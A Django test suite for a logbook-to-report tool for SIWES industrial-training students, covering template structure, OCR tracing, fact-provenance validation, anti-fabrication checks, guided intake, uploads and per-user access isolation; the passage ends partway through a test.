import os
import io
import json
import tempfile
from datetime import date
from pathlib import Path
from django.test import TestCase
from django.test import override_settings
from django.contrib.auth.models import User
from django.core.files.uploadedfile import SimpleUploadedFile
from rest_framework.test import APIClient
from rest_framework import status
import docx
import pymupdf
from PIL import Image
from unittest.mock import patch

from .models import (
    ReportProject, SourceDocument, ExtractedPage, 
    LogbookEntry, LogbookPage, WeekRecord, Fact, Report, ReportSection, DefenceQuestion
)
from .document_processor import process_source_document
from .report_generator import generate_full_report, regenerate_single_section
from .document_exporter import generate_docx_report, convert_docx_to_pdf, export_report_documents
from .defence_generator import (
    generate_defence_questions,
    generate_presentation_slides,
    generate_presentation_script
)
from .feature_flags import DEFAULT_FEATURE_FLAGS, is_feature_enabled, get_all_feature_flags
from .templates import LASUSTECH_CS_V2, LASUSTECH_STANDARD_V1, get_section_requirements, ensure_default_template_in_db
from .ocr_trace import save_tesseract_tsv, trace_root
from .extraction import validate_fact_candidate, persist_fact_candidate, material_sufficiency, classify_page, review_ambiguities, parse_reviewed_page
from .completeness import check_project_completeness


class TemplateV2ContractTests(TestCase):
    def test_v2_matches_coordinator_section_order(self):
        sections = LASUSTECH_CS_V2["sections"]
        self.assertEqual(
            [section["title"] for section in sections if section["chapter"] in range(1, 5)],
            [
                "1.1 Background of SIWES", "1.2 Objectives of SIWES", "1.3 Importance of SIWES",
                "1.4 Scope of the Training", "1.5 Duration of the Training",
                "2.1 Brief History of the Organisation", "2.2 Objectives of the Organisation",
                "2.3 Organisational Structure", "2.4 Organogram of the Organisation",
                "3.1 Duties and Responsibilities", "3.2 Activities Performed", "3.3 Skills Acquired",
                "3.4 Equipment/Tools Used", "3.5 Challenges Encountered", "3.6 Solutions to the Challenges",
                "4.1 Summary", "4.2 Conclusion", "4.3 Recommendations",
            ],
        )

    def test_v2_manifest_confirmation_defaults(self):
        manifest = get_section_requirements()
        self.assertEqual(manifest["version"], "2.0.0")
        fields = manifest["required_fields"]
        self.assertEqual(fields["college"]["status"], "NEEDS_CONFIRMATION")
        self.assertFalse(fields["abstract_enabled"]["default"])
        self.assertTrue(fields["toc_enabled"]["default"])

    def test_v1_snapshot_definition_remains_unchanged(self):
        original = json.loads((Path(__file__).parent / "templates" / "lasustech_standard_v1.json").read_text())
        self.assertEqual(LASUSTECH_STANDARD_V1, original)


class OcrTraceHarnessTests(TestCase):
    def test_tesseract_tsv_is_saved_with_word_boxes_and_confidence(self):
        header = "level\tpage_num\tblock_num\tpar_num\tline_num\tword_num\tleft\ttop\twidth\theight\tconf\ttext\n"
        row = "5\t1\t1\t1\t1\t1\t12\t34\t56\t18\t87.5\tRouter\n"
        with tempfile.TemporaryDirectory() as temp_dir:
            result = save_tesseract_tsv(header + row, Path(temp_dir))
            self.assertEqual(result["words"][0]["text"], "Router")
            self.assertEqual(result["words"][0]["confidence"], 87.5)
            self.assertEqual(result["words"][0]["box"], {"left": 12, "top": 34, "width": 56, "height": 18})
            self.assertTrue((Path(temp_dir) / "tesseract.tsv").exists())
            self.assertTrue((Path(temp_dir) / "raw_ocr.json").exists())

    def test_trace_is_disabled_outside_debug(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            with override_settings(DEBUG=False, LOG2DEF_OCR_TRACE_DIR=temp_dir):
                self.assertIsNone(trace_root())
            with override_settings(DEBUG=True, LOG2DEF_OCR_TRACE_DIR=temp_dir):
                self.assertEqual(trace_root(), Path(temp_dir).resolve())


class ProvenanceExtractionTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="extract-test", password="StrongPassword123!")
        self.project = ReportProject.objects.create(user=self.user, title="Synthetic extraction case")

    def test_fact_quote_requires_exact_transcript_substring(self):
        valid, reason = validate_fact_candidate({
            "kind": "activity", "text": "configured router", "provenance": "LOGBOOK",
            "evidence_quote": "configured router", "inference_reason": "",
        }, "Monday: configured router")
        self.assertTrue(valid)
        self.assertEqual(reason, "")
        invalid, reason = validate_fact_candidate({
            "kind": "tool", "text": "Cisco router", "provenance": "LOGBOOK",
            "evidence_quote": "Cisco router", "inference_reason": "",
        }, "Monday: configured router")
        self.assertFalse(invalid)
        self.assertEqual(reason, "evidence_quote_not_verbatim_substring")
        unsupported_detail = {
            "kind": "tool", "text": "Cisco", "provenance": "LOGBOOK",
            "evidence_quote": "used a router", "inference_reason": "",
        }
        self.assertEqual(
            validate_fact_candidate(unsupported_detail, "used a router"),
            (False, "fact_text_not_verbatim_substring"),
        )

    def test_inference_requires_reason_and_remains_unconfirmed_by_default(self):
        candidate = {"kind": "skill", "text": "learnt tags", "provenance": "INFERRED", "evidence_quote": "learnt tags", "inference_reason": ""}
        self.assertEqual(validate_fact_candidate(candidate, "learnt tags"), (False, "inference_reason_required"))
        candidate["text"] = "HTML"
        candidate["inference_reason"] = "The transcript says the student learnt tags; confirm the specific language."
        fact, error = persist_fact_candidate(self.project, candidate, "learnt tags")
        self.assertEqual(error, "")
        self.assertEqual(fact.status, "proposed")

    def test_fact_review_requires_explicit_confirmation(self):
        fact, _ = persist_fact_candidate(self.project, {
            "kind": "activity", "text": "used the test bench", "provenance": "INFERRED",
            "evidence_quote": "used the test bench", "inference_reason": "The phrase suggests an activity; confirm it.",
        }, "used the test bench")
        client = APIClient()
        client.force_authenticate(user=self.user)
        response = client.get(f"/api/projects/{self.project.id}/facts/")
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.data[0]["status"], "proposed")
        invalid = client.patch(f"/api/projects/{self.project.id}/facts/{fact.id}/", {"status": "confirmed", "text": "extra"}, format="json")
        self.assertEqual(invalid.status_code, 400)
        confirmed = client.patch(f"/api/projects/{self.project.id}/facts/{fact.id}/", {"status": "confirmed"}, format="json")
        self.assertEqual(confirmed.status_code, 200)
        fact.refresh_from_db()
        self.assertEqual(fact.status, "confirmed")

    def test_one_activity_is_insufficient_even_across_many_pages(self):
        for index in range(14):
            document = SourceDocument.objects.create(
                project=self.project, original_filename=f"synthetic-{index}.jpg", file_type="image", page_index=index,
            )
            extracted = ExtractedPage.objects.create(document=document, page_index=index, extracted_text="" if index < 12 else "synthetic text")
            LogbookPage.objects.create(extracted_page=extracted, page_index=index, page_type="blank" if index < 12 else "weekly_record")
        Fact.objects.create(
            project=self.project, kind="activity", text="Configured router", provenance="LOGBOOK",
            evidence_quote="Configured router", status="confirmed",
        )
        result = material_sufficiency(self.project)
        self.assertEqual(result["status"], "insufficient_material")
        self.assertEqual(result["blank_pages_first"], list(range(12)))
        self.assertEqual(result["activity_entries_across_pages"], "1 confirmed activity entry across 14 pages")
        self.assertIn("ch2_history", result["sections"])
        self.assertIn("ch4_recommendations", result["sections"])
        self.assertTrue(result["sections"]["ch2_history"]["enrichment_question"])
        self.assertEqual(result["sections"]["ch3_activities"]["confirmed"], 1)
        completeness = check_project_completeness(self.project)
        self.assertFalse(completeness["can_generate"])
        self.assertIn("material_sufficiency", completeness["missing_required_fields"])
        self.assertEqual(completeness["fields"]["material_sufficiency"]["status"], "Uncertain")
        self.assertEqual(completeness["material_sufficiency"]["status"], "insufficient_material")

    def test_page_classifier_does_not_invent_domain_or_tool(self):
        self.assertEqual(classify_page(""), "blank")
        self.assertEqual(classify_page("Waste Redution Marketplace setup"), "other")
        review = review_ambiguities("Waste Redution Marketplace setup")
        self.assertIn("built, configured, or used", review["clarifying_questions"][0])
        self.assertEqual(review["spelling_suggestions"][0]["suggestion"], "Reduction")
        self.assertFalse(review["spelling_suggestions"][0]["accepted"])

    def test_line_parser_preserves_short_and_table_like_transcript_text(self):
        document = SourceDocument.objects.create(
            project=self.project, original_filename="synthetic-page.jpg", file_type="image", page_index=0,
        )
        extracted = ExtractedPage.objects.create(
            document=document, page_index=0, extracted_text=" Wk 2\n| 4/11/26 |\n-\n",
        )
        page = LogbookPage.objects.create(extracted_page=extracted, page_index=0)
        entries = parse_reviewed_page(page)
        self.assertEqual([entry.text for entry in entries], [" Wk 2", "| 4/11/26 |", "-"])
        self.assertEqual([entry.source_span for entry in entries], [
            {"start": 0, "end": 5}, {"start": 6, "end": 17}, {"start": 18, "end": 19},
        ])

    def test_date_bounds_and_weekday_conflicts_are_reported_without_correction(self):
        document = SourceDocument.objects.create(
            project=self.project, original_filename="synthetic-dates.jpg", file_type="image", page_index=1,
        )
        extracted = ExtractedPage.objects.create(
            document=document, page_index=1,
            extracted_text="Monday 04/11/2026: inspected a board\nTuesday 05/11/2026: checked a cable",
        )
        page = LogbookPage.objects.create(extracted_page=extracted, page_index=1)
        parse_reviewed_page(page)
        week = WeekRecord.objects.get(project=self.project, week_number=0)
        self.assertEqual(str(week.start_date), "2026-11-04")
        self.assertEqual(str(week.end_date), "2026-11-05")
        self.assertEqual([warning["type"] for warning in week.sequence_warnings], [
            "weekday_date_mismatch", "weekday_date_mismatch",
        ])
        self.assertEqual(week.day_entries.first().weekday, "Monday")

    def test_signature_and_stamp_evidence_remain_explicit(self):
        document = SourceDocument.objects.create(
            project=self.project, original_filename="synthetic-marks.jpg", file_type="image", page_index=2,
        )
        extracted = ExtractedPage.objects.create(
            document=document, page_index=2, extracted_text="Official seal affixed",
            supervisor_signature_detected=True,
        )
        page = LogbookPage.objects.create(extracted_page=extracted, page_index=2)
        parse_reviewed_page(page)
        page.refresh_from_db()
        self.assertIs(page.signature_present, True)
        self.assertIs(page.stamp_present, True)

        unknown = ExtractedPage.objects.create(document=document, page_index=3, extracted_text="A plain entry")
        unknown_page = LogbookPage.objects.create(extracted_page=unknown, page_index=3)
        parse_reviewed_page(unknown_page)
        unknown_page.refresh_from_db()
        self.assertIsNone(unknown_page.signature_present)
        self.assertIsNone(unknown_page.stamp_present)

    def test_v2_report_does_not_copy_raw_logbook_lines(self):
        LogbookEntry.objects.create(
            project=self.project, week_number=1, verified_text="Configured Cisco router for 12 users",
            activity_summary="Configured Cisco router for 12 users", is_verified=True,
        )
        report = generate_full_report(self.project)
        for key in ("ch3_duties", "ch3_activities", "ch4_summary"):
            section = report.sections.get(section_key=key)
            self.assertNotIn("Configured Cisco router for 12 users", section.content)
            self.assertNotIn("Cisco", section.content)
            self.assertNotIn("12", section.content)
            self.assertEqual(section.source_links, [])
        self.assertEqual(report.sections.get(section_key="ch3_tools").content, "")

    def test_normalized_report_paragraph_requires_confirmed_fact_ids(self):
        report = generate_full_report(self.project)
        fact, _ = persist_fact_candidate(self.project, {
            "kind": "activity", "text": "checked a network link", "provenance": "LOGBOOK",
            "evidence_quote": "checked a network link", "inference_reason": "",
        }, "checked a network link")
        client = APIClient()
        client.force_authenticate(user=self.user)
        endpoint = f"/api/projects/{self.project.id}/report/paragraphs/"
        payload = {
            "section_key": "ch3_activities", "text": "I checked a network link during the week.",
            "fact_ids": [fact.id], "student_confirmed": True,
        }
        blocked = client.post(endpoint, payload, format="json")
        self.assertEqual(blocked.status_code, 400)
        fact.status = "confirmed"
        fact.save(update_fields=["status"])
        saved = client.post(endpoint, payload, format="json")
        self.assertEqual(saved.status_code, 201)
        self.assertEqual(saved.data["fact_ids"], [fact.id])
        self.assertTrue(saved.data["student_confirmed"])
        self.assertEqual(report.provenance_paragraphs.count(), 1)
        section = report.sections.get(section_key="ch3_activities")
        self.assertIn("I checked a network link", section.content)
        self.assertEqual(section.source_links, [fact.id])

    def test_guided_intake_is_manifest_driven_and_saves_confirmed_facts(self):
        client = APIClient()
        client.force_authenticate(user=self.user)
        endpoint = f"/api/projects/{self.project.id}/intake/"
        initial = client.get(endpoint)
        self.assertEqual(initial.status_code, 200)
        keys = [step["key"] for step in initial.data["required_steps"]]
        self.assertIn("organisation_what", keys)
        self.assertIn("recommendations", keys)
        self.assertTrue(any(step["key"] == "dedication" for step in initial.data["optional_steps"]))
        self.assertIn("guided_intake:organisation_objectives", initial.data["completeness"]["missing_required_fields"])

        empty = client.patch(endpoint, {"key": "organisation_what", "answer": "  "}, format="json")
        self.assertEqual(empty.status_code, 400)
        bad_tree = client.patch(endpoint, {"key": "organogram_tree", "answer": "Director\n      Manager"}, format="json")
        self.assertEqual(bad_tree.status_code, 400)
        saved = client.patch(endpoint, {"key": "organisation_what", "answer": "Repairs small appliances"}, format="json")
        self.assertEqual(saved.status_code, 200)
        fact = Fact.objects.get(project=self.project, source_field="organisation_what")
        self.assertEqual(fact.provenance, "STUDENT_PROVIDED")
        self.assertEqual(fact.status, "confirmed")
        self.assertEqual(fact.evidence_quote, "Repairs small appliances")

    def test_no_challenges_is_explicit_optional_and_pairwise(self):
        client = APIClient()
        client.force_authenticate(user=self.user)
        endpoint = f"/api/projects/{self.project.id}/intake/"
        invalid = client.patch(endpoint, {"key": "challenge_pairs", "answer": {"none": False, "pairs": [{"challenge": "Delay", "solution": ""}]}}, format="json")
        self.assertEqual(invalid.status_code, 400)
        saved = client.patch(endpoint, {"key": "challenge_pairs", "answer": {"none": True, "pairs": []}}, format="json")
        self.assertEqual(saved.status_code, 200)
        self.assertTrue(self.project.__class__.objects.get(id=self.project.id).guided_intake["challenge_pairs"]["none"])
        none_fact = Fact.objects.get(project=self.project, source_field="challenge_pairs:no_challenges")
        self.assertEqual(none_fact.text, "I had none")

    def test_no_challenges_generates_without_challenge_sections_or_placeholders(self):
        self.project.full_name = "Synthetic Student"
        self.project.matric_number = "SYN/001"
        self.project.department = "Synthetic Studies"
        self.project.college = "Synthetic College"
        self.project.degree = "B.Sc. Synthetic Studies"
        self.project.organization_name = "Sample Repair Centre"
        self.project.organization_address = "1 Example Road"
        self.project.training_start_date = date(2025, 1, 6)
        self.project.training_end_date = date(2025, 5, 30)
        self.project.save()
        LogbookEntry.objects.create(
            project=self.project, week_number=1, verified_text="Synthetic activity log",
            activity_summary="Synthetic activity log", is_verified=True,
        )
        for quote in ("checked a returned item", "recorded a repair request"):
            Fact.objects.create(
                project=self.project, kind="activity", text=quote, provenance="LOGBOOK",
                evidence_quote=quote, status="confirmed",
            )
        answers = {
            "organisation_what": "Repairs small appliances",
            "organisation_objectives": "Provide repair services",
            "organisation_structure": "A manager oversees the service team",
            "organogram_tree": "Manager\n  Service team",
            "student_unit": "Service team",
            "supervisor_title": "Workshop manager",
            "duties": "Recorded repair requests\nChecked returned items",
            "challenge_pairs": {"none": True, "pairs": []},
            "recommendations": "Provide a written weekly task plan",
        }
        client = APIClient()
        client.force_authenticate(user=self.user)
        for key, answer in answers.items():
            response = client.patch(
                f"/api/projects/{self.project.id}/intake/", {"key": key, "answer": answer}, format="json",
            )
            self.assertEqual(response.status_code, 200, response.data)
        self.project.refresh_from_db()
        completeness = check_project_completeness(self.project)
        self.assertTrue(completeness["can_generate"], completeness)
        generated = client.post(f"/api/projects/{self.project.id}/report/generate/", {}, format="json")
        self.assertEqual(generated.status_code, 200, generated.data)
        report = Report.objects.get(project=self.project)
        section_keys = set(report.sections.values_list("section_key", flat=True))
        self.assertNotIn("ch3_challenges", section_keys)
        self.assertNotIn("ch3_solutions", section_keys)
        self.assertNotIn("dedication", section_keys)
        self.assertNotIn("acknowledgement", section_keys)
        all_content = "\n".join(report.sections.values_list("content", flat=True))
        for placeholder in ("[INPUT NEEDED]", "[Student", "for your defense", "I had none"):
            self.assertNotIn(placeholder, all_content)
        from .templates import get_section_requirements
        for step in get_section_requirements()["guided_intake"]["steps"]:
            self.assertNotIn(step["hint"], all_content)
        self.assertIn("Repairs small appliances", report.sections.get(section_key="ch2_history").content)
        self.assertIn("Provide a written weekly task plan", report.sections.get(section_key="ch4_recommendations").content)
        history_paragraph = report.provenance_paragraphs.get(section_key="ch2_history", origin="GUIDED_INTAKE")
        recommendation_paragraph = report.provenance_paragraphs.get(section_key="ch4_recommendations", origin="GUIDED_INTAKE")
        self.assertEqual(list(history_paragraph.facts.values_list("source_field", flat=True)), ["organisation_what"])
        self.assertEqual(list(recommendation_paragraph.facts.values_list("source_field", flat=True)), ["recommendations"])


class Log2DefBackendTests(TestCase):
    def setUp(self):
        self.client = APIClient()
        self.user1 = User.objects.create_user(
            username='student1',
            email='student1@lasustech.edu.ng',
            password='StrongPassword123!',
            first_name='Oluwaseun',
            last_name='Adeleke'
        )
        self.user2 = User.objects.create_user(
            username='student2',
            email='student2@lasustech.edu.ng',
            password='StrongPassword123!',
            first_name='Chioma',
            last_name='Eze'
        )

        # Authenticate user1 by default
        login_resp = self.client.post('/api/auth/login/', {
            'username': 'student1',
            'password': 'StrongPassword123!'
        })
        self.token1 = login_resp.data['access']
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # Sample project for user1
        self.project1 = ReportProject.objects.create(
            user=self.user1,
            title='Industrial Training at MainOne Cables',
            full_name='Oluwaseun Adeleke',
            matric_number='STE/2021/0456',
            department='Computer Engineering',
            programme='Computer Engineering',
            level='400',
            university_name='Lagos State University of Science and Technology (LASUSTECH)',
            organization_name='MainOne Cable Company Ltd',
            organization_address='Victoria Island, Lagos State',
            placement_department='Network Operations Center (NOC)',
            industry_supervisor_name='Engr. Babatunde Fashola',
            industry_supervisor_title='Lead NOC Operations Engineer',
            academic_supervisor_name='Dr. K. A. Salami',
            training_start_date=date(2024, 3, 4),
            training_end_date=date(2024, 8, 30),
            organization_activities='Telecommunications infrastructure, subsea fiber routing, and tier III data center hosting.',
            tools_used='Wireshark, Cisco Packet Tracer, Linux Terminal, Fiber OTDR, SNMP Monitoring Tools',
            projects_undertaken='Core switch redundancy configuration and fiber optic splice diagnostics at Lekki landing station.',
            tasks_performed='Monitoring fiber route telemetry, configuring VLAN subnets, and splicing multi-strand armored optical cables.',
            problems_encountered='Fiber attenuation losses due to physical micro-bending in patch cords.',
            skills_acquired='Optical Time Domain Reflectometer (OTDR) analysis, IP subnetting, and enterprise network diagnostics.'
        )
        # Existing report fixtures are explicitly pinned to v1 for regeneration compatibility tests.
        legacy_template = ensure_default_template_in_db()
        Report.objects.create(
            project=self.project1,
            template=legacy_template,
            template_version='lasustech-standard:1.0.0',
            template_snapshot=LASUSTECH_STANDARD_V1,
        )

    def test_registration_and_authentication(self):
        # Register new student
        resp = self.client.post('/api/auth/register/', {
            'username': 'newstudent',
            'email': 'newstudent@lasustech.edu.ng',
            'first_name': 'Amina',
            'last_name': 'Ibrahim',
            'password': 'SecurePass1234!',
            'password_confirm': 'SecurePass1234!'
        })
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertIn('tokens', resp.data)
        self.assertIn('access', resp.data['tokens'])

        # Check me endpoint
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {resp.data['tokens']['access']}")
        me_resp = self.client.get('/api/auth/me/')
        self.assertEqual(me_resp.status_code, status.HTTP_200_OK)
        self.assertEqual(me_resp.data['username'], 'newstudent')

    def test_project_crud_and_ownership_isolation(self):
        # List projects for user1
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        resp = self.client.get('/api/projects/')
        self.assertEqual(resp.status_code, status.HTTP_200_OK)
        self.assertEqual(len(resp.data), 1)
        self.assertEqual(resp.data[0]['id'], self.project1.id)

        # User2 tries to access user1's project -> should fail (404 or forbidden)
        login2 = self.client.post('/api/auth/login/', {
            'username': 'student2',
            'password': 'StrongPassword123!'
        })
        token2 = login2.data['access']
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token2}')
        resp2 = self.client.get(f'/api/projects/{self.project1.id}/')
        self.assertEqual(resp2.status_code, status.HTTP_404_NOT_FOUND)

    def test_upload_typed_note_and_logbook_parsing(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        note_text = (
            "Week 1: Orientation and Network Equipment Familiarization\n"
            "Monday: Introduction to NOC department, safety protocols, and company organogram.\n"
            "Tuesday: Setup of workstation terminal, installed Wireshark and configured static IP.\n"
            "Wednesday: Inspected enterprise rack switches and patch panels.\n"
            "Thursday: Configured console access for Cisco Catalyst 3850 switch.\n"
            "Friday: Weekly review meeting with Engr. Babatunde and logbook presentation."
        )
        resp = self.client.post(f'/api/projects/{self.project1.id}/documents/', {
            'title': 'Week 1 Notes',
            'text': note_text,
            'file_type': 'note'
        })
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertEqual(resp.data['status'], 'completed')

        # Check that logbook entries were parsed
        entries_resp = self.client.get(f'/api/projects/{self.project1.id}/logbook-entries/')
        self.assertEqual(entries_resp.status_code, status.HTTP_200_OK)
        self.assertGreater(len(entries_resp.data), 0)

        # Bulk verify entries
        verify_resp = self.client.post(f'/api/projects/{self.project1.id}/logbook-entries/bulk-verify/', {})
        self.assertEqual(verify_resp.status_code, status.HTTP_200_OK)
        
        verified_count = LogbookEntry.objects.filter(project=self.project1, is_verified=True).count()
        self.assertGreater(verified_count, 0)

    def test_pdf_extraction(self):
        # Create a small valid PDF in-memory using pymupdf
        doc = pymupdf.open()
        page = doc.new_page()
        page.insert_text((50, 72), "Week 2 Logbook Entries\nMonday: Conducted OTDR testing on fiber link.\nTuesday: Spliced core 4 and core 5 fiber strands.")
        pdf_bytes = doc.tobytes()
        doc.close()

        uploaded_file = SimpleUploadedFile("logbook_week2.pdf", pdf_bytes, content_type="application/pdf")
        
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        resp = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'file': uploaded_file},
            format='multipart'
        )
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertEqual(resp.data['status'], 'completed')
        self.assertEqual(resp.data['page_count'], 1)

    def test_image_upload_and_uncertainty_flag(self):
        # Create an image in memory
        img = Image.new('RGB', (400, 300), color=(255, 255, 255))
        img_io = io.BytesIO()
        img.save(img_io, format='PNG')
        img_bytes = img_io.getvalue()

        uploaded_file = SimpleUploadedFile("handwritten_scan.png", img_bytes, content_type="image/png")
        
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        resp = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'file': uploaded_file},
            format='multipart'
        )
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        doc_id = resp.data['id']

        doc = SourceDocument.objects.get(id=doc_id)
        pages = doc.extracted_pages.all()
        self.assertEqual(len(pages), 1)
        # Verify page status is either processed, manual_correction_needed or flagged_illegible without crash
        self.assertIn(pages[0].status, ['processed', 'manual_correction_needed', 'flagged_illegible'])

    def test_bulk_upload_multiple_files_and_limit(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # 1. Bulk upload 3 images
        img1 = Image.new('RGB', (100, 100), color=(255, 255, 255))
        img_io1 = io.BytesIO()
        img1.save(img_io1, format='PNG')
        f1 = SimpleUploadedFile("page1.png", img_io1.getvalue(), content_type="image/png")

        img2 = Image.new('RGB', (100, 100), color=(255, 255, 255))
        img_io2 = io.BytesIO()
        img2.save(img_io2, format='PNG')
        f2 = SimpleUploadedFile("page2.png", img_io2.getvalue(), content_type="image/png")

        img3 = Image.new('RGB', (100, 100), color=(255, 255, 255))
        img_io3 = io.BytesIO()
        img3.save(img_io3, format='PNG')
        f3 = SimpleUploadedFile("page3.png", img_io3.getvalue(), content_type="image/png")

        resp = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'files': [f1, f2, f3]},
            format='multipart'
        )
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertEqual(len(resp.data), 3)

        # 2. Rejection when exceeding 30 files
        too_many_files = []
        for i in range(31):
            too_many_files.append(SimpleUploadedFile(f"file_{i}.png", img_io1.getvalue(), content_type="image/png"))

        exceed_resp = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'files': too_many_files},
            format='multipart'
        )
        self.assertEqual(exceed_resp.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn("Maximum of 30 files", exceed_resp.data['error'])

    def test_document_upload_idempotency(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        img = Image.new('RGB', (100, 100), color=(200, 200, 200))
        img_io = io.BytesIO()
        img.save(img_io, format='PNG')

        client_upload_id = "test-idempotent-uuid-999"
        f1 = SimpleUploadedFile("cover.png", img_io.getvalue(), content_type="image/png")

        # First upload attempt
        resp1 = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'file': f1, 'client_upload_id': client_upload_id, 'page_index': 0},
            format='multipart'
        )
        self.assertEqual(resp1.status_code, status.HTTP_201_CREATED)
        doc1_id = resp1.data['id']
        self.assertEqual(resp1.data['client_upload_id'], client_upload_id)
        self.assertEqual(resp1.data['page_index'], 0)

        # Retry with identical client_upload_id (network retry / resume)
        img_io.seek(0)
        f2 = SimpleUploadedFile("cover.png", img_io.getvalue(), content_type="image/png")
        resp2 = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'file': f2, 'client_upload_id': client_upload_id, 'page_index': 0},
            format='multipart'
        )
        self.assertEqual(resp2.status_code, status.HTTP_200_OK)
        self.assertEqual(resp2.data['id'], doc1_id)
        # Verify no duplicate document was created
        self.assertEqual(
            self.project1.source_documents.filter(client_upload_id=client_upload_id).count(),
            1
        )

    def test_document_reorder_endpoint(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        img = Image.new('RGB', (100, 100), color=(255, 255, 255))
        img_io = io.BytesIO()
        img.save(img_io, format='PNG')

        doc1 = SourceDocument.objects.create(
            project=self.project1,
            original_filename="page_a.png",
            file_type="image",
            file_size=100,
            page_index=0
        )
        doc2 = SourceDocument.objects.create(
            project=self.project1,
            original_filename="page_b.png",
            file_type="image",
            file_size=100,
            page_index=1
        )
        doc3 = SourceDocument.objects.create(
            project=self.project1,
            original_filename="page_c.png",
            file_type="image",
            file_size=100,
            page_index=2
        )

        reorder_payload = {
            "order": [
                {"id": doc1.id, "page_index": 2},
                {"id": doc2.id, "page_index": 0},
                {"id": doc3.id, "page_index": 1},
            ]
        }
        reorder_resp = self.client.patch(
            f'/api/projects/{self.project1.id}/documents/reorder/',
            reorder_payload,
            format='json'
        )
        self.assertEqual(reorder_resp.status_code, status.HTTP_200_OK)
        doc1.refresh_from_db()
        doc2.refresh_from_db()
        doc3.refresh_from_db()
        self.assertEqual(doc1.page_index, 2)
        self.assertEqual(doc2.page_index, 0)
        self.assertEqual(doc3.page_index, 1)

    def test_document_webp_validation(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        webp_img = Image.new('RGB', (120, 120), color=(50, 100, 150))
        webp_io = io.BytesIO()
        webp_img.save(webp_io, format='WEBP')
        webp_file = SimpleUploadedFile("logbook_scan.webp", webp_io.getvalue(), content_type="image/webp")

        resp = self.client.post(
            f'/api/projects/{self.project1.id}/documents/',
            {'file': webp_file},
            format='multipart'
        )
        self.assertEqual(resp.status_code, status.HTTP_201_CREATED)
        self.assertEqual(resp.data['file_type'], 'image')

    def test_document_ownership_enforcement(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')
        doc = SourceDocument.objects.create(
            project=self.project1,
            original_filename="user1_secret.png",
            file_type="image",
            file_size=100,
            page_index=0
        )

        # Authenticate as user 2
        login_resp = self.client.post('/api/auth/login/', {
            'username': 'student2',
            'password': 'StrongPassword123!'
        })
        token2 = login_resp.data['access']
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {token2}')

        # User 2 tries to access User 1's project documents
        resp_list = self.client.get(f'/api/projects/{self.project1.id}/documents/')
        self.assertEqual(resp_list.status_code, status.HTTP_404_NOT_FOUND)

        # User 2 tries to download User 1's document
        resp_download = self.client.get(f'/api/projects/{self.project1.id}/documents/{doc.id}/download/')
        self.assertEqual(resp_download.status_code, status.HTTP_404_NOT_FOUND)

        # User 2 tries to reorder User 1's document
        resp_reorder = self.client.patch(
            f'/api/projects/{self.project1.id}/documents/reorder/',
            {"order": [{"id": doc.id, "page_index": 5}]},
            format='json'
        )
        self.assertEqual(resp_reorder.status_code, status.HTTP_404_NOT_FOUND)

    def test_anti_fabrication_temptation_fixtures(self):
        from .document_processor import validate_structured_entry_anti_fabrication

        # Minimalistic OCR source text
        source_text = "Mon: Replaced ethernet cable and crimped RJ45 connectors in server room."

        # Candidate entry attempting to tempt invention with hallucinated buzzwords
        tempting_candidate = {
            "week_number": 1,
            "day_of_week": "Monday",
            "activity_summary": "Architected Kubernetes cluster with Docker on AWS EKS",
            "tools_used": "Docker, Kubernetes, AWS EKS, RJ45, Ethernet Crimper",
            "equipment_used": "Cisco Catalyst 9300, Server Rack",
            "technical_area": "Cloud Native Infrastructure",
            "has_supervisor_signature": False,
        }

        result = validate_structured_entry_anti_fabrication(
            source_text=source_text,
            entry_data=tempting_candidate,
            page_id=1,
            page_num=1
        )

        # 1. Verify fabricated tools (Docker, Kubernetes, AWS EKS) are discarded
        self.assertNotIn("Docker", result["tools_used"])
        self.assertNotIn("Kubernetes", result["tools_used"])
        self.assertNotIn("AWS EKS", result["tools_used"])
        # Legitimate tools with textual support (RJ45, Ethernet) are retained
        self.assertIn("RJ45", result["tools_used"])
        self.assertIn("Ethernet Crimper", result["tools_used"])

        # 2. Verify unsupported equipment is discarded
        self.assertNotIn("Cisco Catalyst 9300", result["equipment_used"])
        self.assertIn("Server Rack", result["equipment_used"])  # "server" supported

        # 3. Verify entry was flagged due to attempted fabrication
        self.assertTrue(result["is_flagged"])
        self.assertTrue(any("fabricated" in n.lower() for n in result["flag_notes"]))

    def test_field_provenance_and_recording_logic(self):
        from .document_processor import validate_structured_entry_anti_fabrication

        source_text = "Tues: Configured VLAN 20 on switch. Used Cisco CLI. Signed by supervisor."
        entry_data = {
            "week_number": 2,
            "day_of_week": "Tuesday",
            "activity_summary": "Configured VLAN 20 on switch",
            "tools_used": "Cisco CLI",
            "equipment_used": "",
            "technical_area": "Network Switching",
            "has_supervisor_signature": True,
        }

        result = validate_structured_entry_anti_fabrication(
            source_text=source_text,
            entry_data=entry_data,
            page_id=42,
            page_num=3
        )

